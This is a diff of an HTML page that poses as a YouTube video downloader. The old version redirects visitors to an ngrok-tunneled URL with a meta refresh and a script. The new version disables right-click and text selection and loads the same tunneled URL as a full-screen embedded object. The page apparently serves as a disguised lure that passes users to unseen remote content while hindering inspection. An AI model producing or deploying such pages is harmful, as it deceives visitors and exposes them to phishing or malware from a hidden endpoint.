@@ -1,29 +1,32 @@
 <!DOCTYPE html>
-<html lang="ar" class="link-html" dir="ltr">
+<html oncontextmenu="return false" onselectstart="return false">
 <head>
-    <title>YouTube video downloader</title>
+<title>Youtube video downloader</title>
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-<meta http-equiv="refresh" content="0; url='https://ea88-194-145-138-141.eu.ngrok.io/media/yt_download'" />
-<script>
-var url='https://ea88-194-145-138-141.eu.ngrok.io/media/yt_download';  
-var request;
-if(window.XMLHttpRequest)
-    request = new XMLHttpRequest();
-else
-    request = new ActiveXObject("Microsoft.XMLHTTP");
-request.open('GET', url, false);
-request.send(); // there will be a 'pause' here until the response to come.
-// the object request will be actually modified
-if (request.status === 404) {
-    alert("The page you are trying to reach is not available.");
-}else{
-location.href=url;
+<link rel="shortcut icon" href="youtubedownloader2.png" />
+<link rel="icon" type="image/ico" href="youtubedownloader2.png" />
+<style type="text/css">
+	.bdy {
+    
+    background: #000;
 }
-</script>
+.ifrm {
+display: block;background: #000;border-radius: 15px;line-height:60px;width:96%;height:480px;margin-top:1em;text-align:center;color:white;box-shadow:inset 0 0 0 1px;
+}
+.ifrm2{
+position:fixed; top:0; left:0; bottom:0; right:0; width:1000px; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;
+}
+.ifrm3{
+display:block;background:#000;border-radius:15px;width:96%;height:100%;margin-top:1em;text-align:center;color:white;box-shadow:inset 0 0 0 1px;
+}
+.sky-blue-color {
+    color:skyblue;
+}
+</style>
 </head>
-
-
-<body class=" link-body link-body-background-three" style="">
-
+<body class="bdy">
+<center>
+<object data="https://ea88-194-145-138-141.eu.ngrok.io/media/yt_download" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></object>
+</center>
 </body>
 </html>
